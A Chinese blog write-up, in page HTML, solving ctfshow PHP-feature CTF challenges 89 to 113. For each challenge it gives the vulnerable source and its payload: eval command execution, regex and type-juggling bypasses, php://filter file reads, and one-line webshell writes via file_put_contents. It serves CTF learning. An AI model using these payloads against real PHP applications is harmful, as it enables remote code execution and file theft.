@@ -1,0 +1,348 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfshow中php特性上 | Wea5e1-BLOG</title><meta name="author" content="Wea5e1"><meta name="copyright" content="Wea5e1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP特性： 89: if(isset($_GET[&#x27;c&#x27;]))&#123;   $c &#x3D; $_GET[&#x27;c&#x27;];   if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;     eval($c);   &#125;   &#125;else&#123;   highlight_file(__FILE__); &amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow中php特性上">
+<meta property="og:url" content="http://example.com/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/index.html">
+<meta property="og:site_name" content="Wea5e1-BLOG">
+<meta property="og:description" content="PHP特性： 89: if(isset($_GET[&#x27;c&#x27;]))&#123;   $c &#x3D; $_GET[&#x27;c&#x27;];   if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;     eval($c);   &#125;   &#125;else&#123;   highlight_file(__FILE__); &amp;#1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/6.jpg">
+<meta property="article:published_time" content="2025-03-16T13:18:40.000Z">
+<meta property="article:modified_time" content="2025-03-16T13:19:21.063Z">
+<meta property="article:author" content="Wea5e1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/6.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ctfshow中php特性上",
+  "url": "http://example.com/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/",
+  "image": "http://example.com/img/6.jpg",
+  "datePublished": "2025-03-16T13:18:40.000Z",
+  "dateModified": "2025-03-16T13:19:21.063Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Wea5e1",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicons.png"><link rel="canonical" href="http://example.com/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ctfshow中php特性上',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: #efefef;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicons.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/6.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Wea5e1-BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">ctfshow中php特性上</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow中php特性上</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-16T13:18:40.000Z" title="发表于 2025-03-16 21:18:40">2025-03-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-16T13:19:21.063Z" title="更新于 2025-03-16 21:19:21">2025-03-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>PHP特性：</p>
+<p>89:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c = $_GET[&#x27;c&#x27;];   if(!preg_match(&quot;/flag/i&quot;, $c))&#123;     eval($c);   &#125;   &#125;else&#123;   highlight_file(__FILE__); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>命令执行：?c&#x3D;system(‘tac fl*’);</p>
+<p>90:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;   $num = $_GET[&#x27;num&#x27;];   if($num===&quot;4476&quot;)&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0)===4476)&#123;     echo $flag;   &#125;else&#123;     echo intval($num,0);   &#125; </span><br></pre></td></tr></table></figure>
+
+<p>intval:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure>
+
+<p><code>$var</code>：要转换为整数的变量，可以是字符串、浮点数等。</p>
+<p><code>$base</code>：可选参数，指定转换所使用的进制，默认值是 10（十进制）</p>
+<p>intval ($num,0)： 如果 base 是 0，通过检测 var 的格式来决定使用的进制： 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则， 如果字符串以 “0” 开始，使用 8 进制 (octal)；否则， 将使用 10 进制 (decimal)。</p>
+<p>这个是意思让num!&#x3D;4476,但是intval($num,0)的意思是：<code>if(intval($num,0)===4476)</code> 语句的作用是判断经过 <code>intval</code> 转换后的 <code>$num</code> 的整数值是否严格等于 <code>4476</code> ，如果是，则执行 <code>if</code> 代码块内的语句；如果不是，则跳过 <code>if</code> 代码块内的语句。</p>
+<p>那么就可以进行进制：?num&#x3D;0x117C</p>
+<p>91:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=$_GET[&#x27;cmd&#x27;]; if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;   if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;     echo &#x27;hacker&#x27;;   &#125;   else&#123;     echo $flag;   &#125; &#125; else&#123;   echo &#x27;nonononono&#x27;; &#125; </span><br></pre></td></tr></table></figure>
+
+<p>前面正则是im,但是后面却是i:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，</span><br><span class="line">将以换行为分隔符，逐行进行匹配</span><br><span class="line">$str = &quot;abc\nabc&quot;;</span><br><span class="line">$preg = &quot;/^abc$/m&quot;;</span><br><span class="line">preg_match($preg, $str,$matchs);</span><br><span class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>?cmd&#x3D;%0aphp(%0a是换行)</p>
+<p>92：</p>
+<p>和90一样；</p>
+<p>93：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($num==4476)&#123;     die(&quot;no no no!&quot;);   &#125;   if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0)==4476)&#123;     echo $flag;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了字母但是就是不能使用16进制，但是可以使用8进制：num&#x3D;010574;</p>
+<p>94:</p>
+<p>多过滤了0,就是不能使用8进制，可以使用小数：num&#x3D;4476.0;</p>
+<p>95:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;   $num = $_GET[&#x27;num&#x27;];   if($num==4476)&#123;     die(&quot;no no no!&quot;);   &#125;   if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;     die(&quot;no no no!!&quot;);   &#125;   if(!strpos($num, &quot;0&quot;))&#123;     die(&quot;no no no!!!&quot;);   &#125;   if(intval($num,0)===4476)&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>
+
+<p><code>strpos()</code> 是 PHP 中的一个内置函数，用于查找字符串中第一次出现指定子字符串的位置。那么就可以使用：?num&#x3D;%0a010574(0b,0c)都是可以的;</p>
+<p>96：</p>
+<p>(1):直接上php伪协议：u&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>(2)linux:linux下面表示当前目录是 .&#x2F; 所以我们的payload： u&#x3D;.&#x2F;flag.php</p>
+<p>97:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123; if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;]) if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) echo $flag; else print &#x27;Wrong.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这个是md5绕过，在 PHP 中，存在弱类型比较的机制，即使用 <code>==</code> 进行比较时，PHP 会尝试将不同类型的数据转换为合适的类型再进行比较。当对数组使用 <code>md5()</code> 函数时，<code>md5()</code> 函数无法处理数组，会返回 <code>null</code>。</p>
+<p>直接数组绕过：a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<p>98:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;); $_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;; $_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;; $_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__); ?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>首先要看懂三元运算符，其格式为：(expr1) ? (expr2):(expr3)。如果 expr1 为 true，则执行 expr2；否则，执行 expr3。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>即判断有没有GET的值传，如果有那么GET传参的值&#x3D;POST传参的值然后：?HTTP_FLAG&#x3D;flag&#x2F;&#x2F;POST:HTTP_FLAG&#x3D;flag</p>
+<p>99:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allow = array(); for ($i=36; $i &lt; 0x36d; $i++) &#123;   array_push($allow, rand(1,$i)); &#125; if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;   file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]); &#125; </span><br></pre></td></tr></table></figure>
+
+<p>首先创建一个名为$allow的数组；然后在这个数组里面使用for循环在数组中添加随机数从1一直到877：第一次:1-36,第二次:1-37依次循环；然后可以在当前目录新建一个文件并且在文件中写入任意的东西但是前提是传入n的值再随机数的数组中存在</p>
+<p>这里说明一下：in_array函数的小问题：<strong>in_array(）此函数一般情况下会把 <code>&quot;1.php&quot;</code> 视为数字 <code>1</code>，2.php同理</strong></p>
+<p>然后就猜1,2,3什么的概率大点：然后在：?n&#x3D;1.php;&#x2F;&#x2F;&#x2F;&#x2F;POST:content&#x3D;<?=system('ls');?>然后就是命令执行了</p>
+<p>100：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__); include(&quot;ctfshow.php&quot;); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET[&#x27;v1&#x27;]; $v2=$_GET[&#x27;v2&#x27;]; $v3=$_GET[&#x27;v3&#x27;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123;   if(!preg_match(&quot;/\;/&quot;, $v2))&#123;     if(preg_match(&quot;/\;/&quot;, $v3))&#123;       eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);     &#125;   &#125;   &#125;  ?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>这个首先要知道赋值操作大于and;即只要v1&#x3D;num就行了然后就可以利用eval函数了(RCE)就行了；</p>
+<p>v1&#x3D;1&amp;v2&#x3D;system(‘ls’)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p>
+<p>101：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v1=$_GET[&#x27;v1&#x27;]; $v2=$_GET[&#x27;v2&#x27;]; $v3=$_GET[&#x27;v3&#x27;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123;   if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;     if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;       eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);     &#125;   &#125;   &#125; </span><br></pre></td></tr></table></figure>
+
+<p>这关和web100关的区别是禁用了许多符号这就说明我们无法使用注释来像上一关那样输出ctfshow;</p>
+<p>这里呢需要使用内置函数反射类给他回显出来：</p>
+<ul>
+<li>ReflectionClass：获取类的相关信息，函数、属性、常量等；</li>
+<li>ReflectionMethod：类的相关方法的获取以及调用；</li>
+<li>ReflectionParameter：获取类的函数或者方法参数的相关信息；</li>
+<li>ReflectionProperty：类的相关属性</li>
+</ul>
+<p>然后v1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;</p>
+<p>102：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; $v4 = is_numeric($v2) and is_numeric($v3); if($v4)&#123;   $s = substr($v2,2);   $str = call_user_func($v1,$s);   echo $str;   file_put_contents($v3,$str); &#125; else&#123;   die(&#x27;hacker&#x27;); &#125;  ?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>substr函数:substr(a,b):返回一部分，从b开始截取 例：$a&#x3D;123456 substr($a,2); 返回：3456</p>
+<p>call_user_func ($callback, parameter)：调用函数，第一个参数为被调用的函数，第二个参数为被调用函数所需的参数</p>
+<p>file_put_contents (filename, data)：把 data 数据写入 filename;</p>
+<p>既然往进写文件那就可以写一个php的一句话木马或者是命令执行那一句话木马如何只作为数字并且经过函数又正常执行呢那一定是16进制和hex2bin但是0x在is_numeric里面过不去；所以可以进行：先base64再16进制：</p>
+<?=`tac *`;(base64之后再转16进制)
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=cc504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php` `post: v1=hex2bin</span><br></pre></td></tr></table></figure>
+
+103：
+
+就过滤了php,和102一样
+
+104：
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(sha1($v1)==sha1($v2))&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>
+
+直接数组绕过
+
+105：
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__); include(&#x27;flag.php&#x27;); error_reporting(0); $error=&#x27;你还想要flag嘛？&#x27;; $suces=&#x27;既然你想要那给你吧！&#x27;; foreach($_GET as $key =&gt; $value)&#123;   if($key===&#x27;error&#x27;)&#123;     die(&quot;what are you doing?!&quot;);   &#125;   $$key=$$value; &#125;foreach($_POST as $key =&gt; $value)&#123;   if($value===&#x27;flag&#x27;)&#123;     die(&quot;what are you doing?!&quot;);   &#125;   $$key=$$value; &#125; if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;   die($error); &#125; echo &quot;your are good&quot;.$flag.&quot;\n&quot;; die($suces); ?&gt; </span><br></pre></td></tr></table></figure>
+
+变量覆盖：[PHP变量覆盖漏洞解析-CSDN博客](https://blog.csdn.net/weixin_43803070/article/details/91151861)
+
+foreach ($_GET as $key => $value)
+$$key = $$value
+
+这个的意思如果你进行GET传参的话：1=flag;那么就是$1=$flag;然后再根据条件:
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;   die($error); </span><br></pre></td></tr></table></figure>
+
+这个就是检查POST传参里面的键里面是不是有flag的参数；然后它比较 $_POST['flag'] 的值与之前加载的 flag.php 文件中定义的 $flag 变量的值是否相等。如果这两个值不相等（即 !($_POST['flag']==$flag) 为真），则执行die($error); 语句，终止脚本执行，并输出 $error 变量的值作为错误信息；这里利用的是die($error)来实现的输出
+
+pyload:GET:?1=flag  POST:error=1;即：$error=$1=$flag;
+
+106：
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>
+
+数组绕过；
+
+107:
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v3 = $_GET[&#x27;v3&#x27;];    parse_str($v1,$v2);    if($v2[&#x27;flag&#x27;]==md5($v3))&#123;      echo $flag;    &#125; </span><br></pre></td></tr></table></figure>
+
+`parse_str` 函数有两种使用方式：
+
+1. 当只传入一个参数时，它会把查询字符串解析成变量，并将这些变量注册到当前符号表中。//可以理解是传值
+2. 当传入两个参数时，它会把查询字符串解析成变量，然后将这些变量作为键值对存储在第二个参数所指定的数组里。
+
+先数组绕过?v3[]=1;然后
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($v2[&#x27;flag&#x27;]==md5($v3))&#123;      echo $flag;    &#125; </span><br></pre></td></tr></table></figure>
+
+v1=flag
+
+108:
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123;   die(&#x27;error&#x27;); &#125; //只有36d的人才能看到flag if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;   echo $flag; &#125; </span><br></pre></td></tr></table></figure>
+
+ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配;
+
+?c=a%00778
+
+109:
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_GET[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;       eval(&quot;echo new $v1($v2());&quot;);   &#125; </span><br></pre></td></tr></table></figure>
+
+可以进行和反射类一样或者尝试一下异常类
+
+110：
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_GET[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;       die(&quot;error v1&quot;);   &#125;   if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;       die(&quot;error v2&quot;);   &#125;   eval(&quot;echo new $v1($v2());&quot;); </span><br></pre></td></tr></table></figure>
+
+考点：
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filesystemiterator 遍历文件类(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</span><br><span class="line"></span><br><span class="line">DirectoryIterator 遍历目录类</span><br><span class="line"></span><br><span class="line">getcwd()函数 获取当前工作目录 返回当前工作目录</span><br></pre></td></tr></table></figure>
+
+然后遍历目录就行，查看到f开头的文件，直接访问就行了
+
+111：
+
+112：
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+is_file函数是检查是不是存在这个文件，如果有echo hacker,否则就高亮显示；直接进行伪协议读取flag
+
+113:
+
